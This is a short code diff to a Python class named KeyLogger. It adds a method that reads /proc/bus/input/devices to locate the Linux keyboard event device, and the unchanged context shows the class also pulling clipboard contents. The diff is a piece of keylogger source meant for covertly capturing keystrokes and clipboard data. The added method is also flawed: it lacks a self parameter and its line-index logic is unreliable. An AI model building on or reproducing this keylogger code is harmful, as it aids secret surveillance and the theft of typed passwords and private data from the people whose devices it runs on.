@@ -26,6 +26,23 @@ class KeyLogger:
         self.clipboard_content = clipboard.paste()
         #schat.chat(user_input="role:HELP_ROLE:", run=True)
 
+    def linux_find_keyboard_device():
+        ''' Find keyboard device for linux '''
+        with open("/proc/bus/input/devices") as f:
+            lines = f.readlines()
+
+        for line in lines:
+            if "keyboard" in line.lower():
+                next_line = lines[lines.index(line) + 1]
+                event_line = ""
+                for f in lines[lines.index(next_line):]:
+                    if f.strip().startswith("H: Handlers"):
+                        event_line = f
+
+                event = event_line.strip().split("event")[1]
+                event = event.split(" ")[0]
+                return "/dev/input/event" + event
+
     def pull_clipboard(self):
         # Pull clipboard contents
         self.clipboard_content = clipboard.paste()
